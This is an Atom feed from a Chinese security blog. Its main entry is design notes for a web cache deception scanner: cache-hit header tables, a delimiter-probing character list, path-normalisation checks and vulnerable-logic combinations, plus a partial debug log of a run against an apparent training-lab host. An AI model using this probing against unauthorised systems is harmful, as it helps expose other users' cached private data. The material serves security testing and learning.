<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>L的博客</title>
  
  <subtitle>一个渣渣的博客</subtitle>
  <link href="https://lisien11.xyz/atom.xml" rel="self"/>
  
  <link href="https://lisien11.xyz/"/>
  <updated>2025-10-31T06:17:58.921Z</updated>
  <id>https://lisien11.xyz/</id>
  
  <author>
    <name>L</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ffuf使用手册</title>
    <link href="https://lisien11.xyz/2025/10/31/ffuf%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/"/>
    <id>https://lisien11.xyz/2025/10/31/ffuf%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</id>
    <published>2025-10-31T06:17:58.000Z</published>
    <updated>2025-10-31T06:17:58.921Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>GraphQL</title>
    <link href="https://lisien11.xyz/2025/10/31/GraphQL/"/>
    <id>https://lisien11.xyz/2025/10/31/GraphQL/</id>
    <published>2025-10-31T00:50:02.000Z</published>
    <updated>2025-10-31T09:30:54.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是GraphQL"><a href="#什么是GraphQL" class="headerlink" title="什么是GraphQL?"></a>什么是GraphQL?</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是GraphQL&quot;&gt;&lt;a href=&quot;#什么是GraphQL&quot; class=&quot;headerlink&quot; title=&quot;什么是GraphQL?&quot;&gt;&lt;/a&gt;什么是GraphQL?&lt;/h1&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>OAuth2.0认证解析与威胁</title>
    <link href="https://lisien11.xyz/2025/10/27/OAuth2-0%E8%AE%A4%E8%AF%81%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%A8%81%E8%83%81/"/>
    <id>https://lisien11.xyz/2025/10/27/OAuth2-0%E8%AE%A4%E8%AF%81%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%A8%81%E8%83%81/</id>
    <published>2025-10-27T10:26:54.000Z</published>
    <updated>2025-10-27T10:34:10.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是OAuth2-0认证"><a href="#什么是OAuth2-0认证" class="headerlink" title="什么是OAuth2.0认证"></a>什么是OAuth2.0认证</h1><p>OAuth2.0其实就是第三方登陆的一种授权类型，其给授权流程定义了一个标准。</p><h1 id=""><a href="#" class="headerlink" title=" "></a> </h1><h1 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是OAuth2-0认证&quot;&gt;&lt;a href=&quot;#什么是OAuth2-0认证&quot; class=&quot;headerlink&quot; title=&quot;什么是OAuth2.0认证&quot;&gt;&lt;/a&gt;什么是OAuth2.0认证&lt;/h1&gt;&lt;p&gt;OAuth2.0其实就是第三方登陆的一种授权类型，其</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>缓存劫持扫描器</title>
    <link href="https://lisien11.xyz/2025/10/22/%E7%BC%93%E5%AD%98%E5%8A%AB%E6%8C%81%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
    <id>https://lisien11.xyz/2025/10/22/%E7%BC%93%E5%AD%98%E5%8A%AB%E6%8C%81%E6%89%AB%E6%8F%8F%E5%99%A8/</id>
    <published>2025-10-22T08:20:28.000Z</published>
    <updated>2025-10-27T12:15:40.993Z</updated>
    
    <content type="html"><![CDATA[<h1 id="爬虫模块。"><a href="#爬虫模块。" class="headerlink" title="爬虫模块。"></a>爬虫模块。</h1><p>使用ktana来进行url的主动爬取，深度要可选择，默认就2吧<br>使用gau来被动获取url<br>将获取的所有url丢到下面的缓存检测模块进行检测，并标记上是否缓存进行分类。以方便下面的缓存逻辑检测模块</p><h1 id="缓存检测模块"><a href="#缓存检测模块" class="headerlink" title="缓存检测模块"></a>缓存检测模块</h1><p>对同一个url进行3次请求，当三次中出现了如下的响应头的规范就缓存命中</p><h2 id="cdn"><a href="#cdn" class="headerlink" title="cdn"></a>cdn</h2><p>出现如下响应头时其缓存命中<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">CDN提供商缓存状态响应头字段表示命中的值响应头示例</span><br><span class="line">CloudflareCF-Cache-StatusHITCF-Cache-Status: HIT</span><br><span class="line">AWS CloudFrontX-CacheHit from cloudfrontX-Cache: Hit from cloudfront</span><br><span class="line">AkamaiX-Cache, Server-Timing包含HIT的值X-Cache: TCP_HIT, Server-Timing: cdn-cache; desc=HIT</span><br><span class="line">FastlyX-Cache, X-Served-ByHITX-Cache: HIT, HIT, X-Served-By: cache-hkg17926-HKG</span><br><span class="line">Varnish CacheX-Cache, X-Cache-HitsHITX-Cache: HIT, X-Cache-Hits: 4</span><br><span class="line">Nginx Proxy CacheX-Proxy-Cache, X-CacheHITX-Proxy-Cache: HIT</span><br><span class="line">百度云加速X-CacheHIT from baiducdnX-Cache: HIT from baiducdn</span><br><span class="line">腾讯云CDNX-Cache-Lookup, X-CacheHit From DisktankX-Cache-Lookup: Hit From Disktank</span><br><span class="line">阿里云CDNX-Cache, Ali-Swift-Global-SavetimeHIT from cdnX-Cache: HIT from cdn, Ali-Swift-Global-Savetime: 1700000000</span><br><span class="line">七牛云CDNX-Cache, X-LogHITX-Cache: HIT, X-Log: Qiniu;...</span><br><span class="line">华为云CDNX-Cache, X-Cache-LookupHIT from cacheX-Cache: HIT from cache</span><br><span class="line">网宿CDNX-CacheHIT from wangsuX-Cache: HIT from wangsu</span><br><span class="line">又拍云X-Cache, X-Upyun-Content-LengthHITX-Cache: HIT, X-Upyun-Content-Length: 12345</span><br><span class="line">京东云CDNX-Cache, X-Cache-LookupHit from JDCDNX-Cache-Lookup: Hit from JDCDN</span><br><span class="line">百度智能云X-BD-Cache-StatusHITX-BD-Cache-Status: HIT</span><br><span class="line">Google Global CacheAge, ViaAge &gt; 0Age: 600, Via: 1.1 google</span><br></pre></td></tr></table></figure></p><div class="table-container"><table><thead><tr><th>CDN / 缓存系统</th><th>命中标识字段</th><th>常见取值</th><th>是否命中缓存</th><th>示例响应头</th></tr></thead><tbody><tr><td><strong>Cloudflare</strong></td><td><code>CF-Cache-Status</code></td><td><code>HIT</code> / <code>MISS</code> / <code>EXPIRED</code> / <code>BYPASS</code> / <code>DYNAMIC</code></td><td>✅ <code>HIT</code> 表示命中</td><td><code>CF-Cache-Status: HIT</code><br><code>Age: 523</code></td></tr><tr><td><strong>AWS CloudFront</strong></td><td><code>X-Cache</code></td><td><code>Hit from cloudfront</code> / <code>Miss from cloudfront</code> / <code>Error from cloudfront</code></td><td>✅ <code>Hit from cloudfront</code></td><td><code>X-Cache: Hit from cloudfront</code><br><code>Age: 214</code></td></tr><tr><td><strong>Akamai</strong></td><td><code>X-Cache</code>、<code>Server-Timing</code></td><td><code>TCP_HIT</code> / <code>TCP_MISS</code> / <code>TCP_REFRESH_HIT</code> / <code>TCP_EXPIRED_HIT</code></td><td>✅ 含 <code>HIT</code> 的值均表示命中</td><td><code>X-Cache: TCP_HIT</code><br><code>Server-Timing: cdn-cache; desc=HIT</code></td></tr><tr><td><strong>Fastly</strong></td><td><code>X-Cache</code>、<code>X-Served-By</code></td><td><code>HIT</code> / <code>MISS</code> / <code>PASS</code></td><td>✅ <code>HIT</code></td><td><code>X-Served-By: cache-hkg17926-HKG</code><br><code>X-Cache: HIT, HIT</code></td></tr><tr><td><strong>Varnish Cache</strong></td><td><code>X-Cache</code>、<code>X-Cache-Hits</code>、<code>Via</code></td><td><code>HIT</code> / <code>MISS</code> / <code>BYPASS</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache: HIT</code><br><code>X-Cache-Hits: 4</code><br><code>Via: 1.1 varnish</code></td></tr><tr><td><strong>Nginx Proxy Cache</strong></td><td><code>X-Proxy-Cache</code>、<code>X-Cache</code></td><td><code>HIT</code> / <code>MISS</code> / <code>BYPASS</code></td><td>✅ <code>HIT</code></td><td><code>X-Proxy-Cache: HIT</code></td></tr><tr><td><strong>百度云加速（Baidu Cloud CDN）</strong></td><td><code>X-Cache</code></td><td><code>HIT from baiducdn</code> / <code>MISS from baiducdn</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache: HIT from baiducdn</code></td></tr><tr><td><strong>腾讯云 CDN（Tencent Cloud CDN）</strong></td><td><code>X-Cache-Lookup</code>、<code>X-Cache</code></td><td><code>Hit From Disktank</code> / <code>Miss From Upstream</code> / <code>Bypass</code></td><td>✅ <code>Hit</code></td><td><code>X-Cache-Lookup: Hit From Disktank</code></td></tr><tr><td><strong>阿里云 CDN（Aliyun CDN）</strong></td><td><code>X-Cache</code>、<code>Ali-Swift-Global-Savetime</code></td><td><code>HIT from cdn</code> / <code>MISS from cdn</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache: HIT from cdn</code><br><code>Ali-Swift-Global-Savetime: 1700000000</code></td></tr><tr><td><strong>七牛云 CDN（Qiniu CDN）</strong></td><td><code>X-Cache</code>、<code>X-Log</code></td><td><code>HIT</code> / <code>MISS</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache: HIT</code><br><code>X-Log: Qiniu;...</code></td></tr><tr><td><strong>华为云 CDN（Huawei Cloud CDN）</strong></td><td><code>X-Cache</code>、<code>X-Cache-Lookup</code></td><td><code>HIT from cache</code> / <code>MISS from origin</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache: HIT from cache</code></td></tr><tr><td><strong>网宿 CDN（Wangsu CDN）</strong></td><td><code>X-Cache</code></td><td><code>HIT from wangsu</code> / <code>MISS from wangsu</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache: HIT from wangsu</code></td></tr><tr><td><strong>又拍云（UPYUN）</strong></td><td><code>X-Cache</code>、<code>X-Upyun-Content-Length</code></td><td><code>HIT</code> / <code>MISS</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache: HIT</code><br><code>X-Upyun-Content-Length: 12345</code></td></tr><tr><td><strong>京东云 CDN（JD Cloud）</strong></td><td><code>X-Cache</code>、<code>X-Cache-Lookup</code></td><td><code>Hit from JDCDN</code> / <code>Miss from Upstream</code></td><td>✅ <code>Hit</code></td><td><code>X-Cache-Lookup: Hit from JDCDN</code></td></tr><tr><td><strong>百度智能云 BOS/CDN</strong></td><td><code>X-BD-Cache-Status</code></td><td><code>HIT</code> / <code>MISS</code> / <code>EXPIRED</code></td><td>✅ <code>HIT</code></td><td><code>X-BD-Cache-Status: HIT</code></td></tr><tr><td><strong>Google Global Cache (GGC)</strong></td><td><code>Age</code> / <code>Via</code></td><td>无特定标志，命中时 <code>Age</code> &gt; 0</td><td>✅ 有 <code>Age</code> 且 &gt; 0</td><td><code>Age: 600</code><br><code>Via: 1.1 google</code></td></tr></tbody></table></div><hr><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><div class="table-container"><table><thead><tr><th>反向代理系统</th><th>命中标识字段</th><th>可能值</th><th>是否命中</th><th>示例</th></tr></thead><tbody><tr><td><strong>Nginx Proxy Cache</strong></td><td><code>X-Proxy-Cache</code></td><td><code>HIT</code> / <code>MISS</code> / <code>BYPASS</code> / <code>EXPIRED</code></td><td>✅ <code>HIT</code> 表示命中</td><td><code>X-Proxy-Cache: HIT</code></td></tr><tr><td></td><td><code>X-Cache-Status</code>（新版）</td><td><code>HIT</code> / <code>MISS</code> / <code>BYPASS</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache-Status: HIT</code></td></tr><tr><td><strong>Varnish Cache</strong></td><td><code>X-Cache</code> / <code>X-Cache-Hits</code> / <code>Via</code></td><td><code>HIT</code> / <code>MISS</code> / <code>BYPASS</code></td><td>✅ <code>X-Cache: HIT</code></td><td><code>X-Cache: HIT</code><br><code>Via: 1.1 varnish</code></td></tr><tr><td><strong>Squid Proxy</strong></td><td><code>X-Cache</code> / <code>X-Cache-Lookup</code></td><td><code>HIT from proxy</code> / <code>MISS from proxy</code></td><td>✅ 包含 <code>HIT</code></td><td><code>X-Cache: HIT from squid</code></td></tr><tr><td><strong>Apache Traffic Server (ATS)</strong></td><td><code>X-Cache</code> / <code>X-Cache-Key</code> / <code>Via</code></td><td><code>HIT</code> / <code>MISS</code> / <code>STALE</code> / <code>REVALIDATED</code></td><td>✅ <code>HIT</code></td><td><code>X-Cache: HIT</code><br><code>Via: http/1.1 ats (ApacheTrafficServer)</code></td></tr><tr><td><strong>LiteSpeed / OpenLiteSpeed</strong></td><td><code>X-LiteSpeed-Cache</code></td><td><code>hit</code> / <code>miss</code> / <code>no-cache</code> / <code>force-recache</code></td><td>✅ <code>hit</code></td><td><code>X-LiteSpeed-Cache: hit</code></td></tr><tr><td><strong>Nginx + FastCGI Cache</strong></td><td><code>X-FastCGI-Cache</code></td><td><code>HIT</code> / <code>MISS</code> / <code>BYPASS</code></td><td>✅ <code>HIT</code></td><td><code>X-FastCGI-Cache: HIT</code></td></tr></tbody></table></div><hr><h1 id="缓存逻辑检测"><a href="#缓存逻辑检测" class="headerlink" title="缓存逻辑检测"></a>缓存逻辑检测</h1><h2 id="1-静态文件缓存逻辑"><a href="#1-静态文件缓存逻辑" class="headerlink" title="1.静态文件缓存逻辑"></a>1.静态文件缓存逻辑</h2><p>有些服务器会将静态后缀文件设置为缓存。<br>直接对传入的url添加a.js,a.css等即发送<a href="https://xxxxxx/a.js或者http://xxxxxxxx/a.js">https://xxxxxx/a.js或者http://xxxxxxxx/a.js</a><br>当缓存命中时则存在静态文件缓存逻辑</p><h2 id="2-分隔符验证"><a href="#2-分隔符验证" class="headerlink" title="2.分隔符验证"></a>2.分隔符验证</h2><p>选择一个不可缓存的路径，可以优先查找login这类动态页面，如果爬取的url中没用则随机选择。注意需要这个页面返回200如果非200换一个，直到200<br>然后对这个url进行如下操作，下面以url为<a href="http://xxxxx/login举例（具体url根据实际情况获取）">http://xxxxx/login举例（具体url根据实际情况获取）</a><br>再url后直接添加一个aa如<a href="http://xxxxx/login变为http://xxxxx/loginaa如果两个页面的返回相同则后端做了强制校验换一个路径">http://xxxxx/login变为http://xxxxx/loginaa如果两个页面的返回相同则后端做了强制校验换一个路径</a><br>当<a href="http://xxxxx/login与http://xxxxx/loginaa不同时，使用如下字典来进行分隔符检测">http://xxxxx/login与http://xxxxx/loginaa不同时，使用如下字典来进行分隔符检测</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">!</span><br><span class="line">&quot;</span><br><span class="line">#</span><br><span class="line">$</span><br><span class="line">%</span><br><span class="line">&amp;</span><br><span class="line">&#x27;</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">*</span><br><span class="line">+</span><br><span class="line">,</span><br><span class="line">-</span><br><span class="line">.</span><br><span class="line">/</span><br><span class="line">:</span><br><span class="line">;</span><br><span class="line">&lt;</span><br><span class="line">=</span><br><span class="line">&gt;</span><br><span class="line">?</span><br><span class="line">@</span><br><span class="line">[</span><br><span class="line">\</span><br><span class="line">]</span><br><span class="line">^</span><br><span class="line">_</span><br><span class="line">`</span><br><span class="line">&#123;</span><br><span class="line">|</span><br><span class="line">&#125;</span><br><span class="line">~</span><br><span class="line">%21</span><br><span class="line">%22</span><br><span class="line">%23</span><br><span class="line">%24</span><br><span class="line">%25</span><br><span class="line">%26</span><br><span class="line">%27</span><br><span class="line">%28</span><br><span class="line">%29</span><br><span class="line">%2A</span><br><span class="line">%2B</span><br><span class="line">%2C</span><br><span class="line">%2D</span><br><span class="line">%2E</span><br><span class="line">%2F</span><br><span class="line">%3A</span><br><span class="line">%3B</span><br><span class="line">%3C</span><br><span class="line">%3D</span><br><span class="line">%3E</span><br><span class="line">%3F</span><br><span class="line">%40</span><br><span class="line">%5B</span><br><span class="line">%5C</span><br><span class="line">%5D</span><br><span class="line">%5E</span><br><span class="line">%5F</span><br><span class="line">%60</span><br><span class="line">%7B</span><br><span class="line">%7C</span><br><span class="line">%7D</span><br><span class="line">%7E</span><br></pre></td></tr></table></figure><br>将这些字符一个个的嵌入<a href="http://xxxxxx/xxxx{字典中的分隔符}aa">http://xxxxxx/xxxx{字典中的分隔符}aa</a><br>如果这个url与<a href="http://xxxxxx/xxxx返回相同则那个字符即为分隔符">http://xxxxxx/xxxx返回相同则那个字符即为分隔符</a></p><h2 id="3-静态目录缓存检测"><a href="#3-静态目录缓存检测" class="headerlink" title="3.静态目录缓存检测"></a>3.静态目录缓存检测</h2><p>提取出专门存在静态问题的目录，再后面加上不存在文件aaaa如果换成则其存静态目录缓存，如果有多个静态目录就提取多个检测<br>举例<br>如果爬虫爬出了如下路径<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxxxxx/static/aa.js</span><br><span class="line">http://xxxxxx/static/aa.css</span><br><span class="line">http://xxxxxx/static/aa.txt</span><br></pre></td></tr></table></figure><br>那么<a href="http://xxxxxx/static/就是静态目录再后面加上aaaaa即http://xxxxxx/static/aaaaa">http://xxxxxx/static/就是静态目录再后面加上aaaaa即http://xxxxxx/static/aaaaa</a><br>若缓存则存在静态目录缓存逻辑</p><h2 id="4-服务器规范化检测"><a href="#4-服务器规范化检测" class="headerlink" title="4.服务器规范化检测"></a>4.服务器规范化检测</h2><h3 id="缓存服务器规范化"><a href="#缓存服务器规范化" class="headerlink" title="缓存服务器规范化"></a>缓存服务器规范化</h3><h4 id="规范化"><a href="#规范化" class="headerlink" title="../规范化"></a>../规范化</h4><p>从爬取的url中获取一个可缓存的url,如果存在静态文件缓存则不找静态文件的路径<br>如<a href="http://xxxxxxx/aaa">http://xxxxxxx/aaa</a><br>如果<a href="http://xxxxxxx/a/..%2faaa可缓存则存在缓存服务器规范化">http://xxxxxxx/a/..%2faaa可缓存则存在缓存服务器规范化</a></p><h3 id="源服务器规范化"><a href="#源服务器规范化" class="headerlink" title="源服务器规范化"></a>源服务器规范化</h3><p>提取一个爬取url随便什么。如<a href="http://xxxxx/test">http://xxxxx/test</a><br>访问<a href="http://xxxxx/a/..%2ftest">http://xxxxx/a/..%2ftest</a><br>当两个请求的body相同时存在源服务器规范化</p><h1 id="出现如下逻辑组合则大概率存在漏洞"><a href="#出现如下逻辑组合则大概率存在漏洞" class="headerlink" title="出现如下逻辑组合则大概率存在漏洞"></a>出现如下逻辑组合则大概率存在漏洞</h1><h2 id="静态文件缓存-分隔符"><a href="#静态文件缓存-分隔符" class="headerlink" title="静态文件缓存+分隔符"></a>静态文件缓存+分隔符</h2><h2 id="静态目录缓存-缓存服务器规范化"><a href="#静态目录缓存-缓存服务器规范化" class="headerlink" title="静态目录缓存+缓存服务器规范化"></a>静态目录缓存+缓存服务器规范化</h2><h2 id="缓存服务器规范化-源服务器不规范化"><a href="#缓存服务器规范化-源服务器不规范化" class="headerlink" title="缓存服务器规范化+源服务器不规范化"></a>缓存服务器规范化+源服务器不规范化</h2><h2 id="源服务器规范化，但缓存没有规范化"><a href="#源服务器规范化，但缓存没有规范化" class="headerlink" title="源服务器规范化，但缓存没有规范化"></a>源服务器规范化，但缓存没有规范化</h2><p>[*] 扫描完成.<br>root@VM-4-16-debian:~/cache# go build -o cache-hijacking-scanner<br>root@VM-4-16-debian:~/cache# ./cache-hijacking-scanner -u <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/</a> -d 2 -v</p><p>—- 正在扫描 <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/</a> —-<br>[<em>] 正在运行爬虫模块…<br>2025/10/23 20:44:44 [DEBUG] Katana raw output:<br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/js/tracking.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/js/tracking.js</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labsBlog.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labsBlog.css</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=10">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=10</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=3">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=3</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/labHeader.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/labHeader.js</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/css/academyLabHeader.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/css/academyLabHeader.css</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=9">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=9</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=7">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=7</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/submitSolution.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/submitSolution.js</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=8">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=8</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=1">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=1</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=5">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=5</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=2">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=2</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=6">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=6</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=4">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post?postId=4</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</a><br><a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labs.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labs.css</a><br>    [+] Katana发现 10 个URL<br>2025/10/23 20:44:53 [DEBUG] Gau raw output:<br>    [+] Gau发现 0 个URL<br>    [</em>] 总计独立URL: 10</p><p>[*] 正在运行缓存检测模块…<br>2025/10/23 20:44:53 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labsBlog.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labsBlog.css</a><br>2025/10/23 20:44:54 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/labHeader.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/labHeader.js</a><br>2025/10/23 20:44:54 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/css/academyLabHeader.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/css/academyLabHeader.css</a><br>2025/10/23 20:44:54 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/submitSolution.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/labheader/js/submitSolution.js</a><br>2025/10/23 20:44:54 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/</a><br>2025/10/23 20:44:54 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/</a><br>2025/10/23 20:44:54 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/</a><br>2025/10/23 20:44:55 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account</a><br>2025/10/23 20:44:55 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account</a><br>2025/10/23 20:44:55 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/my-account</a><br>2025/10/23 20:44:56 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</a><br>2025/10/23 20:44:56 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</a><br>2025/10/23 20:44:56 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/login</a><br>2025/10/23 20:44:56 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a><br>2025/10/23 20:44:56 [DEBUG] Requesting URL (2/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a><br>2025/10/23 20:44:57 [DEBUG] Requesting URL (3/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/post</a><br>2025/10/23 20:44:57 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/js/tracking.js">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/js/tracking.js</a><br>2025/10/23 20:44:57 [DEBUG] Requesting URL (1/3): <a href="https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labs.css">https://0a8b007e038b1af1813bb2fe00e20034.web-security-academy.net/resources/css/labs.css</a></p><p>[<em>] 正在运行缓存逻辑检测模块…<br>2025/10/23 20:44:57 [DEBUG] Requesting URL (1/3): <a 